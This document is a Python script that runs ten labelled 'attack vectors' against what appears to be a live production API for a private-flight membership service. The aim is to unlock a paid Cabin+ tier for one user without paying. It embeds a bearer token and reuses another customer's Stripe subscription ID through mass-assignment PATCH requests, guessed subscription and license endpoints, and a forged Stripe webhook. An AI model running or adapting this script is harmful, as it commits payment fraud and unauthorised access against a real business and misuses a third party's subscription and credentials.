#!/usr/bin/env python3
"""
Try to activate Cabin+ for Ashley now that she has a Stripe Customer ID
"""

import requests
import json
import time

PROD_URL = "https://vauntapi.flyvaunt.com"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

# Sameer's subscription ID (known working)
SAMEER_SUB_ID = "sub_1RXC7YBkrWmvysmuXyGVEYPF"

def make_request(method, endpoint, data=None):
    headers = {
        "Authorization": f"Bearer {ASHLEY_TOKEN}",
        "Content-Type": "application/json"
    }
    
    url = f"{PROD_URL}{endpoint}"
    
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=10)
        
        return {"status": r.status_code, "data": r.json() if r.text else None}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_status():
    r = make_request("GET", "/v1/user")
    if r['status'] == 200 and r['data']:
        return {
            "subscriptionStatus": r['data'].get('subscriptionStatus'),
            "stripeSubscriptionId": r['data'].get('stripeSubscriptionId'),
            "license": r['data'].get('license')
        }
    return None

print("="*80)
print("TRYING TO ACTIVATE CABIN+ FOR ASHLEY (With Stripe Customer ID)")
print("="*80)

baseline = check_status()
print(f"\n📊 Baseline:")
print(f"   Stripe Customer ID: cus_TMQ5kN5yjgYTLR ✅")
print(f"   Subscription Status: {baseline['subscriptionStatus']}")
print(f"   Stripe Subscription ID: {baseline['stripeSubscriptionId']}")
print(f"   License: {baseline['license']}")

print("\n" + "="*80)
print("ATTACK VECTORS")
print("="*80)

attacks = [
    {
        "name": "V1: Assign Sameer's subscription ID",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {"stripeSubscriptionId": SAMEER_SUB_ID}
    },
    {
        "name": "V2: Set subscriptionStatus = 3 with Stripe Sub",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {
            "subscriptionStatus": 3,
            "stripeSubscriptionId": SAMEER_SUB_ID
        }
    },
    {
        "name": "V3: Complete membership object",
        "method": "PATCH",
        "endpoint": "/v1/user",
        "data": {
            "subscriptionStatus": 3,
            "stripeSubscriptionId": SAMEER_SUB_ID,
            "subscriptionStartDate": 1734480000000,
            "subscriptionRenewalDate": 1766707200000,
            "license": {
                "membershipTier": {"id": 1, "name": "base", "priorityLevel": 1},
                "stripeSubscriptionId": SAMEER_SUB_ID,
                "expiresAt": 1766707200000
            }
        }
    },
    {
        "name": "V4: Create subscription via POST",
        "method": "POST",
        "endpoint": "/v1/subscription",
        "data": {
            "tier": "cabin+",
            "stripeSubscriptionId": SAMEER_SUB_ID
        }
    },
    {
        "name": "V5: Activate subscription",
        "method": "POST",
        "endpoint": "/v1/subscription/activate",
        "data": {"subscriptionId": SAMEER_SUB_ID}
    },
    {
        "name": "V6: Link existing Stripe subscription",
        "method": "POST",
        "endpoint": "/v1/subscription/link",
        "data": {"stripeSubscriptionId": SAMEER_SUB_ID}
    },
    {
        "name": "V7: Create license directly",
        "method": "POST",
        "endpoint": "/v1/license",
        "data": {
            "membershipTier": 1,
            "stripeSubscriptionId": SAMEER_SUB_ID,
            "expiresAt": 1766707200000
        }
    },
    {
        "name": "V8: Webhook simulation (subscription.created)",
        "method": "POST",
        "endpoint": "/v1/webhook/stripe",
        "data": {
            "type": "customer.subscription.created",
            "data": {
                "object": {
                    "id": SAMEER_SUB_ID,
                    "customer": "cus_TMQ5kN5yjgYTLR",
                    "status": "active"
                }
            }
        }
    },
    {
        "name": "V9: Sync subscription from Stripe",
        "method": "POST",
        "endpoint": "/v1/subscription/sync",
        "data": None
    },
    {
        "name": "V10: Claim free trial",
        "method": "POST",
        "endpoint": "/v1/subscription/trial/claim",
        "data": {"tier": "cabin+"}
    },
]

successful = []

for i, attack in enumerate(attacks, 1):
    print(f"\n{'='*80}")
    print(f"🔥 {attack['name']}")
    print(f"{'='*80}")
    print(f"   {attack['method']} {attack['endpoint']}")
    
    result = make_request(attack['method'], attack['endpoint'], attack['data'])
    print(f"   Status: {result['status']}")
    
    if result['status'] == 200:
        print("   ✅ Request accepted!")
        
        # Check if anything changed
        time.sleep(0.5)
        new_status = check_status()
        
        if new_status != baseline:
            print(f"\n   🚨 CHANGES DETECTED!")
            
            if new_status['subscriptionStatus'] != baseline['subscriptionStatus']:
                print(f"   subscriptionStatus: {baseline['subscriptionStatus']} → {new_status['subscriptionStatus']}")
            if new_status['stripeSubscriptionId'] != baseline['stripeSubscriptionId']:
                print(f"   stripeSubscriptionId: {baseline['stripeSubscriptionId']} → {new_status['stripeSubscriptionId']}")
            if new_status['license'] != baseline['license']:
                print(f"   license: {baseline['license']} → {new_status['license']}")
            
            successful.append(attack['name'])
            baseline = new_status
        else:
            print("   ❌ No changes detected")
    
    elif result['status'] == 404:
        print("   ❌ Endpoint not found")
    else:
        print(f"   ❌ Failed")

print("\n" + "="*80)
print("FINAL STATUS")
print("="*80)

final = check_status()
print(f"\nSubscription Status: {final['subscriptionStatus']}")
print(f"Stripe Subscription ID: {final['stripeSubscriptionId']}")
print(f"License: {final['license']}")

if final['subscriptionStatus'] == 3:
    print("\n✅✅✅ SUCCESS! Ashley has Cabin+ membership!")
else:
    print("\n❌ Still no Cabin+ access")

if successful:
    print(f"\n🎯 Successful attacks: {len(successful)}")
    for name in successful:
        print(f"   ✅ {name}")
else:
    print("\n❌ No successful attacks - server security intact")
